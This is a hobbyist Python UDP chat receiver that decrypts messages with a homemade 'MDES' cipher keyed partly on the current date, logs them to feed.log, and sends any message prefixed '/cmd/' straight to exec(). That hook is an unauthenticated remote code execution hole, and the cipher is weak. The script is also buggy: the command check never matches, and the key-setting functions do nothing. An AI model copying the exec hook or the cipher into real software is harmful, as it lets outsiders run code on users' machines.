import os
import math
import socket
import datetime
os.system('color 0a')
os.system('cls')
buf = 1024
msg3=[]
#---------------------------------------------------------------
"""MDES - Multiplicity Data Encryption System
Designed by Ben Appleby"""

from random import randint

k0=[83,54,33,63,76,158,52,200,191,103,145,179,73,64,183,126]
k=[]
for i in range(len(k0)):
	k.append(k0[i]*int(datetime.datetime.now().day))
sigma=k[0]+k[1]+k[2]+k[3]+k[4]+k[5]+k[6]+k[7]+k[8]+k[9]+k[10]+k[11]+k[12]+k[13]+k[14]+k[15]

def f(x): return 1/2*x**3-5.542*x+5
def df(x): return 3/2*x**2-5.542

def setKeyChar(inKey):
    k=[] #Doesn't seem to be working. :( Global possibly?
    for i in range(0,len(inKey)):
        k.append(ord(inKey[i]))
    print("Assigned a ",len(inKey)+1," byte key")

def setKey(inKey):
    k=[]
    for i in range(0,len(inKey)):
        k.append(int(inKey[i]))
    print("Assigned a ",len(inKey)+1," byte key")
        
def newRaphson(x,inKey,tol=1.09e-9):
    for i in range(25):
        dx=(f(x)-inKey)/df(x)
        x=x-dx
        if abs(dx) <tol: return x,i
    print("Too many iterations! \n")


def decrypt(DataIn):
    daOut=""
    shift=0
    shift2=k[0]
    for i in range(0,len(DataIn)):
        shift=k[i%16]
        root,numIter = newRaphson(2,shift)
        daOut=daOut+chr(int(DataIn[i]/(round(root*(sigma/shift)))))
        shift2=shift
    return daOut
#-------------------------------------------------------------------------------------

ip = socket.gethostbyname(socket.gethostname())
port = 13000
UDPsock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
addr = (ip, port)
print("========Chat Messages========")
UDPsock.bind(addr)


while True:
    (data, addr) = UDPsock.recvfrom(buf)
    msg = str(data)
    msg = msg[2:len(msg)-1]
    msg2=msg.replace(',','').replace('[','').replace(']','')
    msg2=msg2.split()
    for i in msg2:
        msg3.append(int(i))
    msgfinal = str(decrypt(msg3))
    msg3=[]
    print(msgfinal)
    t= open('feed.log','a')
    t.write("\n"+msgfinal)
    t.close()
    if msgfinal[:4]== ("/cmd/"):
        exec(msgfinal[4:])
